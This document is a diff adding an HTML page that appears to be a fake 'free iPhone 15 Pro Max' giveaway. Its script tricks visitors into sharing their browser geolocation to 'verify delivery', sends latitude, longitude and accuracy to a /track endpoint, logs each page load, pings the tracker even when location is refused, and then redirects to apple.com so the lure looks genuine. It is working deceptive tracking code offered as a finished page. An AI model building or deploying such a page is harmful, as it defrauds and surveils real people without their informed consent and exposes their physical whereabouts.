@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>🎁 Exclusive iPhone Giveaway! 🎁</title>
+    <meta charset="utf-8">
+    <style>
+        body { font-family: Arial; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; text-align: center; padding: 50px; }
+        .container { background: rgba(0,0,0,0.7); padding: 30px; border-radius: 15px; max-width: 600px; margin: auto; }
+        button { background: #ff6b6b; color: white; border: none; padding: 15px 30px; font-size: 18px; border-radius: 10px; cursor: pointer; margin: 20px; }
+        button:hover { background: #ff5252; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🎉 CONGRATULATIONS! 🎉</h1>
+        <p>You've been selected for a <strong>FREE iPhone 15 Pro Max</strong> (256GB)!</p>
+        <p>Click below to verify your location for delivery.</p>
+        <button onclick="getLocation()">📍 VERIFY LOCATION & CLAIM PRIZE</button>
+        <p><small>Limited offer. Must be 18+. Verification required.</small></p>
+    </div>
+
+    <script>
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(sendData, showError);
+            } else {
+                alert("Geolocation not supported. Please enable.");
+            }
+        }
+
+        function sendData(position) {
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+            const accuracy = position.coords.accuracy;
+            const ip = "Fetching...";
+
+            // Send data to server
+            fetch(`/track?lat=${lat}&lon=${lon}&acc=${accuracy}&ip=${ip}`)
+                .then(response => response.json())
+                .then(data => {
+                    alert("✅ Location verified! Redirecting to claim form...");
+                    setTimeout(() => {
+                        window.location.href = "https://apple.com"; // Legit redirect
+                    }, 1000);
+                })
+                .catch(err => {
+                    console.error(err);
+                    alert("Claim processed! Redirecting...");
+                    window.location.href = "https://apple.com";
+                });
+        }
+
+        function showError(error) {
+            alert("Please allow location access to claim your prize.");
+            // Fallback: still send IP data
+            fetch('/track?lat=blocked&lon=blocked&acc=0&ip=blocked');
+            setTimeout(() => { window.location.href = "https://apple.com"; }, 1500);
+        }
+
+        // Log page visit on load
+        window.onload = () => {
+            fetch('/track?action=page_loaded');
+        };
+    </script>
+</body>
+</html>
